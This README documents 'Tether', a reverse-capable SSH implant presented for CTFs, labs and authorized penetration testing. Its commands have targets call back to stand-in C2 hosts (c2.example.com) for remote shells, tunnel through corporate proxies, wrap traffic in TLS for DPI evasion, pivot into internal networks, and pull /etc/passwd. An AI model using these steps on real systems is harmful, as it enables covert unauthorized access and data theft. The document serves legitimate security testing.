# Tether

**A tiny, statically linked SSH server with reverse-connection support for CTFs, security labs, and authorized testing.**

Tether provides a compact SSH endpoint that can be deployed as a single binary. It provides an interactive terminal, SFTP file transfer, and SSH port forwarding without requiring a full SSH server installation on the test system.

Tether supports two connection configurations:

* **Bind mode:** the SSH service listens for incoming connections.
* **Reverse mode:** the test host establishes an outbound connection to a configured SSH endpoint.

The binary is designed for temporary use in controlled environments such as CTFs, isolated security labs, development environments, and authorized assessments.

## Features

* **Interactive terminal** with PTY, TAB completion, history, and job control
* **File transfer** using SFTP and SCP
* **SSH port forwarding** including local, remote, and dynamic forwarding
* **Bind and reverse connection modes**
* **Automatic reconnection** for temporary network interruptions
* **Multi-catcher failover** with round-robin over a comma-separated target list
* **Proxy-aware dialing** via HTTP CONNECT, HTTPS CONNECT, and SOCKS5
* **Optional TLS wrapping** to blend into HTTPS traffic on port 443
* **SSH keepalives** for connection monitoring
* **Graceful shutdown** with `Ctrl-C` / `SIGTERM`
* **Cross-platform** support for Linux, macOS, and Windows
* **Multiple architectures** including `amd64`, `386`, `arm64`, and `armv7`
* **Build-time configuration** for credentials, shell, and connection defaults
* **Optional session recording** for lab documentation and troubleshooting
* **Small static binaries**, typically under 2 MB

## Intended Use

Tether is intended for:

* Capture-the-Flag competitions
* Local security labs
* Isolated test environments
* Authorized penetration testing
* Security research
* Remote administration of systems where you have permission to connect

Only deploy Tether on systems you own or are explicitly authorized to test.

## Requirements

Running a prebuilt binary only requires an operating system supported by the corresponding Go runtime:

* **Linux:** kernel 2.6.23+
* **Windows:** Windows 7 / Server 2008R2+
* **macOS:** 64-bit Intel or Apple Silicon releases supported by current Go

To build Tether yourself:

* Go **1.24 or newer**
* Optionally `upx` for smaller binaries

## Build

The `build.sh` wrapper provides the simplest build workflow:

```shell
$ ./build.sh          # build for the local OS/architecture
$ ./build.sh all      # build the complete release matrix
$ ./build.sh test     # build a local testing binary
```

Or use `make`:

```shell
$ make
$ make compressed
```

Binaries are written to `bin/` and use the naming format:

```text
tether-<os>-<arch>
```

## Build-Time Configuration

Defaults can be compiled into the binary for repeatable lab deployments.

| Variable    | Description                                                       |
| ----------- | ----------------------------------------------------------------- |
| `PASS`      | Login password                                                    |
| `PUB`       | Authorized public key                                             |
| `SHELL_BIN` | Shell or command interpreter                                      |
| `LHOST`     | Default server address(es) for reverse mode (comma-separated)     |
| `LPORT`     | Listening or connection port                                      |
| `BPORT`     | Local port used for the reverse configuration                     |
| `SESSLOG`   | Directory for optional session logs                               |
| `PROXY`     | Outbound proxy URL (`http://`, `https://`, `socks5://`)           |
| `SNI`       | TLS server name hint; also enables `-tls` by default when set     |

For example, generate a dedicated test key:

```shell
$ ssh-keygen -t ed25519 -f id_tether
```

A reverse configuration can then be built with:

```shell
$ LHOST=10.10.14.5 LPORT=443 BPORT=0 \
  PUB="$(cat id_tether.pub)" ./build.sh all
```

To bake in an outbound proxy and TLS wrapping for restrictive networks:

```shell
$ LHOST=c2.example.com LPORT=443 \
  PROXY=socks5://proxy.corp.com:1080 \
  SNI=c2.example.com ./build.sh all
```

The equivalent `make` variables are `RS_PASS`, `RS_PUB`, `RS_SHELL`, `LUSER`, `LHOST`, `LPORT`, `BPORT`, and `NOCLI`.

Cross-compile a specific target with `GOOS` and `GOARCH`:

```shell
$ GOARCH=arm64 GOOS=linux make compressed
```

Use `go tool dist list` to view supported Go targets.

## Usage

Tether implements a standard SSH interface, so standard OpenSSH clients can be used.

### Interactive terminal

```shell
$ ssh -p <PORT> <HOST>
```

### Execute a command

```shell
$ ssh -p <PORT> <HOST> whoami
```

### Transfer files

```shell
$ sftp -P <PORT> <HOST>
```

### Dynamic forwarding

```shell
$ ssh -p <PORT> -D 9050 <HOST>
```

## CTF Quickstart

Each scenario shows what to run on **your machine** and on the **target**, then how to connect.

> **Note on host key prompts:** Tether generates a new host key on every start.
> SSH blocks the connection with `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED`
> if it has seen a different key for that IP before. Since tether restarts
> frequently in CTF use, `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`
> is added to all connect commands below to skip the prompt.

---

### 1. Basic shell (bind mode)

| | Command |
|---|---|
| **Your machine** | `./tether -l -v` |
| **Connect** | `ssh -p 31337 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |

---

### 2. Port 443 — baked binary, no flags on target

Build once on your machine:

```shell
LHOST=<your-ip> LPORT=443 BPORT=0 ./build.sh linux-amd64
```

| | Command |
|---|---|
| **Your machine** | `./tether -l -v -p 443` |
| **Target** | `./tether` — no flags, everything baked in |
| **Connect** | `ssh -p <port-printed-in-log> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |

`BPORT=0` lets the OS pick a free port; the chosen port appears in the verbose log.

---

### 3. Two-catcher failover

| | Command |
|---|---|
| **Your machine (both VPS)** | `./tether -l -v -p 443` |
| **Target** | `./tether vps1.example.com,vps2.example.com` |
| **Connect** | `ssh -p 8888 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |

Target tries each in round-robin. Backoff applies only after both fail.

---

### 4. Session recording

| | Command |
|---|---|
| **Your machine** | `./tether -l -v -L ~/sessions` |
| **Target** | `./tether <your-ip>` |
| **Connect** | `ssh -p 8888 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |
| **Logs** | `ls ~/sessions/` — one timestamped file per session |

---

### 5. Through a SOCKS5 proxy

Useful when the target can only reach the internet via an internal proxy:

```shell
# bake proxy in at build time
PROXY=socks5://proxy.corp.com:1080 LHOST=<your-ip> ./build.sh linux-amd64
```

Or set an env var on the target at runtime:

```shell
ALL_PROXY=socks5://proxy.corp.com:1080 ./tether <your-ip>
```

| | Command |
|---|---|
| **Your machine** | `./tether -l -v -p 443` |
| **Target** | `./tether` (proxy baked in) or env var set |
| **Connect** | `ssh -p 8888 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |

---

### 6. TLS-wrapped on port 443 (DPI evasion)

Place a TLS terminator (nginx, haproxy, stunnel) in front of your listener,
then build the target binary with TLS enabled:

```shell
SNI=<your-hostname> LHOST=<your-ip> LPORT=443 ./build.sh linux-amd64
```

| | Command |
|---|---|
| **Your machine** | nginx/stunnel on `:443` → `./tether -l :31337` |
| **Target** | `./tether` — TLS enabled automatically via baked `SNI` |
| **Connect** | `ssh -p 8888 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |

Without a terminator, use `-tls` for a direct TLS-wrapped SSH connection to
any listener that speaks TLS.

---

### 7. File transfer

| | Command |
|---|---|
| **Your machine** | `./tether -l -v` |
| **Target** | `./tether <your-ip>` |
| **Upload** | `scp -o StrictHostKeyChecking=no -P 8888 tool.elf <your-ip>:` |
| **Download** | `scp -o StrictHostKeyChecking=no -P 8888 <your-ip>:/etc/passwd .` |
| **Interactive** | `sftp -o StrictHostKeyChecking=no -P 8888 <your-ip>` |

---

### 8. Pivot — SOCKS proxy out through the target

| | Command |
|---|---|
| **Your machine** | `./tether -l -v` |
| **Target** | `./tether <your-ip>` |
| **SOCKS** | `ssh -p 8888 -D 9050 -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>` |
| **Use** | `proxychains nmap -sV 10.10.10.0/24` |

For a static port forward to a specific internal host:

```shell
ssh -p 8888 -L 8080:10.10.10.50:80 -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <your-ip>
```

---

## Bind Mode

In bind mode, Tether listens for an incoming SSH connection.

Start the service on the test host:

```shell
testhost$ ./tether -l -p 2222
```

Connect from the operator workstation:

```shell
operator$ ssh -p 2222 <TEST_HOST>
```

Use `-p 0` to allow the operating system to select an available port. The selected port is displayed when verbose logging is enabled with `-v`.

## Reverse Mode

Reverse mode allows a test host to establish the SSH connection to a configured server.

Start the SSH endpoint:

```shell
operator$ ./tether -v -l -p 443
```

Start Tether on the test host:

```shell
testhost$ ./tether -v -p 443 <SERVER_IP>
```

The test host establishes the connection to the configured server. A local SSH endpoint is then available for the operator workstation:

```shell
operator$ ssh -p 8888 127.0.0.1
operator$ sftp -P 8888 127.0.0.1
```

If the connection is interrupted, Tether automatically attempts to reconnect using an exponential backoff. SSH keepalives are used to detect interrupted sessions.

Use a port appropriate for the network configuration of your authorized test environment.

## SSH Configuration

A dedicated test key can be placed in `~/.ssh/` and referenced from the SSH configuration:

```text
Host tether-test
    Hostname 127.0.0.1
    Port 8888
    IdentityFile ~/.ssh/id_tether
    IdentitiesOnly yes
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
```

The host can then be accessed with:

```shell
$ ssh tether-test
$ sftp tether-test
```

The relaxed host-key settings above are intended for disposable CTF and laboratory environments.

## Command-Line Reference

```text
tether v1.3.0-dev

Usage: tether [options] [[<user>@]<target>[,<target>...]]

  -l     Listening (bind) mode
  -p     Listen or connection port                 (default: 31337)
  -b     Reverse mode local port                   (default: 8888; 0 = any)
  -s     Shell or command interpreter              (default: /bin/bash)
         On Windows, ssh-shellhost.exe can improve
         terminal compatibility on older systems
  -N     Disable shell/exec/subsystem and local forwarding
  -L     Directory to record session output into (one file per session)
  -tls   Wrap the outbound connection in TLS (reverse mode only)
  -v     Enable diagnostic logging
  -V     Print version and exit

<target>   One or more comma-separated host[:port] addresses for reverse mode.
           All targets are tried in round-robin order before exponential
           backoff is applied. Backoff resets on any successful connection.
```

## Local Testing

Tether can be tested entirely on a single machine.

Build the test configuration:

```shell
$ ./build.sh test
$ chmod 600 assets/id_tether
```

For disposable local testing, OpenSSH can be configured to skip host-key prompts:

```shell
-o StrictHostKeyChecking=no
-o UserKnownHostsFile=/dev/null
```

### Bind Test

Start the service:

```shell
testhost$ ./bin/tether-test -v -l -p 2222
```

Connect from another terminal:

```shell
operator$ ssh -i assets/id_tether -p 2222 localhost
operator$ sftp -P 2222 localhost
```

The test configuration uses the password:

```text
testpass123
```

### Reverse Test

Start the local SSH endpoint:

```shell
operator$ ./bin/tether-test -v -l -p 4444
```

Start the reverse configuration:

```shell
testhost$ ./bin/tether-test -v -p 4444 localhost
```

Connect through the resulting local endpoint:

```shell
operator$ ssh -i assets/id_tether -p 8888 localhost
```

For a two-machine laboratory test, replace `localhost` with the address of the SSH endpoint.

## Multi-Catcher Failover

Reverse mode accepts a comma-separated list of `host[:port]` targets. Tether
tries each in round-robin order. Exponential backoff is applied only after all
targets in the list have been exhausted, and resets on any successful connection.

```shell
testhost$ ./tether -v 10.10.14.5,10.10.14.6,backup.example.com:443
```

Targets with no port use the value from `-p`. Targets with an explicit port
override it for that entry only.

## Proxy-Aware Dialing

Tether routes all outbound connections through a proxy when one is configured.
Supported proxy schemes:

| Scheme      | Description                                       |
| ----------- | ------------------------------------------------- |
| `http://`   | HTTP CONNECT with optional `user:pass` auth       |
| `https://`  | HTTP CONNECT over a TLS-wrapped proxy connection  |
| `socks5://` | SOCKS5 with optional RFC 1929 user/pass auth      |

Set the proxy at build time:

```shell
$ PROXY=socks5://user:pass@proxy.corp.com:1080 ./build.sh
```

Or use standard environment variables at runtime (checked in this order):
`HTTPS_PROXY`, `https_proxy`, `ALL_PROXY`, `all_proxy`.

## TLS Wrapping

The `-tls` flag wraps the outbound SSH connection in TLS before the SSH
handshake. This makes the traffic indistinguishable from HTTPS to a firewall
or DPI appliance.

```shell
testhost$ ./tether -tls -p 443 c2.example.com
```

The `SNI` build variable sets the TLS server name (used by a terminating
reverse proxy to route to the correct backend). When `SNI` is baked in, `-tls`
is enabled automatically.

```shell
$ SNI=c2.example.com LHOST=c2.example.com LPORT=443 ./build.sh
```

On the catcher side, place a TLS terminator (nginx, haproxy, stunnel) in front
of Tether's SSH listener:

```
target  ──TLS(SNI=c2.example.com)──▶  :443 nginx  ──▶  tether -l :31337
```

## Session Logging

Pass `-L <dir>` to record the output of every inbound session to a timestamped
file in `<dir>` (one file per session, output only — input is never recorded):

```shell
operator$ ./tether -l -v -L ~/.tether/sessions
```

Or bake in a default log directory at build time:

```shell
$ SESSLOG=/var/log/tether ./build.sh
```

Each log file is named `<timestamp>-<peer>-<user>.log` and includes a metadata
header line with the session kind, terminal dimensions, and start time.

## Docker Test

A `docker-compose.yml` is included for end-to-end local testing without
touching the host network.

```shell
$ docker compose up --build
```

This starts a `catcher` (bind mode) and a `target` (reverse mode) on an
isolated Docker bridge network. The target dials back automatically.

Get a shell inside the target container:

```shell
$ docker compose exec catcher \
    ssh -p 8888 -o StrictHostKeyChecking=no reverse@127.0.0.1
# password: testpass123
```

Port 8888 is also exposed to the host, so you can connect directly:

```shell
$ ssh -p 8888 reverse@127.0.0.1
```

To test the SOCKS5 proxy path, uncomment the `proxy` service in
`docker-compose.yml` and rebuild the target with the `PROXY` variable set.

## Automated Checks

Run the same checks used by CI:

```shell
$ go vet ./...
$ go test -race ./...
```

## Windows Caveats

A fully interactive PowerShell session uses Windows ConPTY and requires at least **Windows 10 Build 17763**.

Older Windows versions still provide a command shell, but terminal features such as arrow keys and `Ctrl-C` may be limited.

For improved compatibility, place `ssh-shellhost.exe` next to Tether and specify it with:

```shell
$ tether -s ssh-shellhost.exe
```

## Security and Authorization

Tether provides remote terminal access and file-transfer capabilities. Treat deployed binaries and credentials as sensitive.

For security testing, use Tether only within environments where you have explicit authorization.

For CTFs and laboratory environments, use isolated infrastructure and disposable credentials whenever possible.
